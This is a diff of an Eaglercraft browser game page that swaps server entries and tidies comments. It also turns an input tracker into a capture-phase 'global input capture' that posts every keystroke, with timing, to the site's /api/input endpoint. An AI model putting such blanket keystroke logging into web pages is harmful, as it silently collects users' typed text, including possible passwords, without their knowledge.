@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html style="width:100%;height:100%;background-color:black;">
+
 <head>
 	<meta charset="UTF-8" />
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" />
-	<meta name="description" content="gams.lol | Play tons of Eaglercraft clients in your browser." />
-	<meta name="keywords" content="eaglercraft, minecraft" />
+	<meta name="viewport"
+		content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" />
 
 	<title>Marky Tuff Client</title>
 
@@ -18,13 +18,13 @@
 	window.addEventListener("load", function() {
 
 		if(window.location.href.indexOf("file:") === 0) {
-			alert("Use HTTP, not local files");
+			alert("Use HTTP instead of opening locally");
 			return;
 		}
 
-		// =========================
+		// =========================================
 		// GAME OPTIONS
-		// =========================
+		// =========================================
 
 		var relayId = Math.floor(Math.random() * 3);
 
@@ -35,29 +35,28 @@
 			worldsDB: "worlds",
 
 			servers: [
-				{ addr: "wss://play.freepvp.org/", name: "VoidSent" },
-				{ addr: "wss://krypticmc.net/", name: "§4§lKrypticMC [FEATURED]" },
-				{ addr: "wss://play.webmc.fun/", name: "§c§lWebMC [PARTNER]" },
+				{ addr: "wss://pcsmp.net/", name: "Modern PVP" },
+				{ addr: "wss://krypticmc.net/", name: "KrypticMC" },
+				{ addr: "wss://play.webmc.fun/", name: "WebMC" },
 				{ addr: "wss://beta.arch.lol/", name: "ArchMC" }
 			],
 
 			relays: [
-				{ addr: "wss://relay.deev.is/", comment: "relay #1", primary: relayId === 0 },
-				{ addr: "wss://relay.lax1dude.net/", comment: "relay #2", primary: relayId === 1 },
-				{ addr: "wss://relay.shhnowisnottheti.me/", comment: "relay #3", primary: relayId === 2 }
+				{ addr: "wss://relay.deev.is/", comment: "relay1", primary: relayId === 0 },
+				{ addr: "wss://relay.lax1dude.net/", comment: "relay2", primary: relayId === 1 },
+				{ addr: "wss://relay.shhnowisnottheti.me/", comment: "relay3", primary: relayId === 2 }
 			]
 		};
 
-		// =========================
+		// =========================================
 		// SESSION TRACKING
-		// =========================
+		// =========================================
 
 		let sessionId = crypto.randomUUID();
 		let startTime = Date.now();
 
 		console.log("SESSION:", sessionId);
 
-		// create session
 		fetch("/api/start", {
 			method: "POST",
 			headers: {
@@ -67,17 +66,17 @@
 				sessionId: sessionId
 			})
 		})
-		.then(res => res.text())
+		.then(r => r.text())
 		.then(console.log)
 		.catch(console.error);
 
-		// =========================
-		// INPUT TRACKING
-		// =========================
+		// =========================================
+		// GLOBAL INPUT CAPTURE
+		// =========================================
 
-		window.addEventListener("keyup", (e) => {
+		window.addEventListener("keydown", function(e) {
 
-			console.log("KEY:", e.key);
+			console.log("CAPTURED:", e.key);
 
 			fetch("/api/input", {
 				method: "POST",
@@ -90,15 +89,15 @@
 					time: Date.now() - startTime
 				})
 			})
-			.then(res => res.text())
+			.then(r => r.text())
 			.then(console.log)
 			.catch(console.error);
 
-		});
+		}, true);
 
-		// =========================
-		// END GAME FUNCTION
-		// =========================
+		// =========================================
+		// END GAME
+		// =========================================
 
 		window.endGame = function(score) {
 
@@ -111,16 +110,13 @@
 					sessionId: sessionId,
 					score: score
 				})
-			})
-			.then(res => res.text())
-			.then(console.log)
-			.catch(console.error);
+			});
 
 		};
 
-		// =========================
+		// =========================================
 		// START GAME
-		// =========================
+		// =========================================
 
 		main();
 
